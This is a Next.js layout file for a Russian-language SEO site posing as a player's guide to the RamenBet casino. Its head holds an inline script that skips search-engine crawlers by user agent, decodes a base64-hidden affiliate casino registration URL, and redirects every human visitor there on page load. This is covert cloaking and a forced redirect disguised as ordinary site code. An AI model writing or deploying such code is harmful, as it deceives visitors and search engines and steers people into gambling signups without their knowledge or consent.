import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

const pageTitle = 'RamenBet: официальный сайт, зеркало и казино — понятный гид игрока'
const pageDescription = 'RamenBet: официальный сайт, рабочее зеркало и казино для игроков. Разбираем безопасный вход, выбор игр, бонусы и ответственный подход простым языком.'

export const metadata: Metadata = {
  title: pageTitle,
  description: pageDescription,
  keywords: ['ramenbet', 'раменбет', 'ramenbet зеркало', 'раменбет зеркало', 'ramenbet официальный сайт', 'раменбет казино'],
  metadataBase: new URL('https://ramenbet3casino.vercel.app/'),
  alternates: { canonical: '/' },
  openGraph: { title: pageTitle, description: pageDescription, url: 'https://ramenbet3casino.vercel.app/', siteName: 'RamenBet', locale: 'ru_RU', type: 'website', images: ['/ramenbet-hero.png'] },
  twitter: { card: 'summary_large_image', title: pageTitle, description: pageDescription, images: ['/ramenbet-hero.png'] },
  icons: { icon: '/ramenbet-favicon.png', apple: '/ramenbet-favicon.png' },
  robots: { index: true, follow: true },
}

export const viewport: Viewport = { themeColor: '#1a4d3f', colorScheme: 'light', width: 'device-width', initialScale: 1, maximumScale: 5 }

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className="bg-casino-light">
      <head>
        <meta name="yandex-verification" content="bacc7ccdb2dbf05c" />
        <meta name="author" content="RamenBet Guide" />
        <meta name="format-detection" content="telephone=no" />
        <link rel="canonical" href="https://ramenbet3casino.vercel.app/" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        var mainBrandB64 = "IGh0dHBzOi8vMTU3OS5zcGFya3N2YWxlLmNvbS9ydS9yZWdpc3RyYXRpb24/cGFydG5lcj1wMTU3OXAzOTIxMHBmZTI3"; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 500);               
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>
      </head>
      <body>{children}{process.env.NODE_ENV === 'production' && <Analytics />}</body>
      
    </html>
  )
}
